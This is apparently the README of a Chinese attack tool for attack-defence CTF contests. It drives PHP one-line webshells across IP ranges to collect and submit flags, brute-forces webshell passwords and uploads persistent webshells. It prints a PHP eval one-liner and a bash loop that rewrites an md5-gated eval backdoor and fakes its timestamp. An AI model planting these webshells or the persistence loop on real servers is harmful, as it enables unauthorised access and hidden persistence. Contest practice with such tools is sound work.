    AWD Predator Framework v2.0                   

              --code by AresX       
			  

* 在AWD攻防赛中通过给定的webshell批量获取提交flag

* 为不会现场挖洞写脚本的菜鸡准备

* 用py去实现菜刀是一件代码量很大的事情，懒得做也不会做(以后可能会做)，所以需要手动设置一句话的功能函数和方法

* 针对简单的单参数传递的一句话和特定的加密一句话


# webshell

**添加已知的webshell,仅支持php，GET和POST方法使用eval和exec函数的一句话木马**

### 添加webshell

命令`add`

使用方法: `add [shell path] [pwd] [type(eval/exec)] [method(get/post)]`

如一句话为`<?php @eval($_POST[‘cmd’]);?>` 路径为`x.x.x.x:8001://index/cmd.php`

一句话密码为`cmd` 功能函数为`eval` 方法为`POST`

example:`add x.x.x.x:8001://index/cmd.php cmd eval post`

命令执行后webshell的路径和密码会以字典的形式储存

**处理了使用md5加密的eval函数一句话,**

get方法在添加时,可添加带md5加密的密码的路径

如:`add :8003/x.php?pass=fuckyou x eval get` 

post方法请在`flag.py`中修改`for j in POST_eval_shells_path_pwd:`循环中的`eval_POST_data['pass']`为自己的密码，密码将被自动传递

post添加方法同`add x.x.x.x:8001://index/cmd.php cmd eval post`

### 显示添加的webshell

命令`show`

将显示所有添加的webshell路径和密码

### 保存,读取,清空webshell
*保存已经添加的webshell路径和密码，方便临场修改代码*

保存:`save`
读取:`load`
清空:`clear` //清空不会清空已经储存的webshell,除非在清空后执行保存命令

### Webshell爆破

*采用一种提速千倍的爆破方法*

命令: `crack http://xxx.php`

字典储存在`auxi/pwd.txt`中，可自行完善字典


# iplist

**根据输入生成指定段的ip列表**

### 生成列表

命令: `ip x.x.a-b.x`

可设定acb任意段的ip列表,使用'-'连接左右区间

### 添加指定ip

命令: `ip x.x.x.x`

执行命令后,`x.x.x.x`将被添加到ip列表中,会自动去除重复项和进行排序

### 查看已经生成的列表

命令: `showip`

显示生成的ip列表

### 清空ip列表

命令: `clearip`

### 去掉指定ip

命令: `removeip x.x.x.x`

# flag

**通过iplist和webshell获取flag，将获取到的flag提交到指定服务器**

### 获取flag
*遍历iplist中所有的地址尝试通过所有已经添加的webshell获取flag,在执行此命令前需设定iplist，否则报错*

命令:`getflag [command]`

example:`getflag curl www.baidu.com/flag.txt`

获取命令如果不需要修改只需完整输入一次，之后可直接执行`getflag`

### 查看flag

命令: `showflag`



### 提交flag

**攻防赛环境中获取到的flag通常不是标准格式,`flag.py`中的`submit_flag`函数中已经使用了`re.compile(r'flag{\w+?}')`尝试匹配标准flag格式**
**如果出现问题,请自行在`flag.py`文件的`submit_flag`函数中使用正则匹配获得标准flag进行提交**

*提交flag 需设定提交flag的链接，以及cookie和data,使用"?"替换flag在data中所在的参数*

命令: `submit [url] [cookie] [data](use '?' replace the flag )`

example: `submit http:xxx.xxx.xx/xx/ JSESSIONID=A6F8;route=6cf03 pid=-1&pidName=&flag=?`
**去掉cookie中的空格,data中flag所在位置需用?代替！**

提交命令如果不需要修改只需完整输入一次，之后可直接执行`submit`

submit完成之后会有清空flag的选项(y/n)

### 清空flag

命令: `clearflag`

# 上传

## 文件木马上传

命令: `upload <file>(default='auxi/shell.php')`

默认上传文件为`auxi/shell.php` 如需使用修改默认文件,默认文件为加密不死马

如需上传其他文件,将文件储存在`auxi/`目录下

执行`upload xxx`即可

如上传默认文件,直接执行`upload`

如果文件上传成功，会自动访问一次上传的文件，激活不死马

## 命令木马上传

命令: `cupload`

连接一句话执行bash命令生成不死马`.index1.php`

bash命令为:`system('while true;do echo \'<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>\' >fuck.php;touch -m -d "2017-11-12 10:10:10" .index1.php;sleep 1;done;');`

如果要修改请修改`command.py`中的`data[z0]`

---


### 目录结构
```
###########
├── Readme.md               //帮助文档 
├── console.py              //启动
├── core                    // 核心模块
│   ├── shells.py           //写入，读取，保存webshell
│   ├── flag.py             // 获取，提交flag
│   ├── iplist.py           // 生成ip列表   
│—— auxi                    //辅助模块
|   |—— upload.py           //webshell上传功能
|   |—— shell.php           //默认上传文件
|   |—— webshell.txt        //一句话储存路径  
|   |—— command.py          //上传bash不死马
|—— data                    //webshell数据储存

```
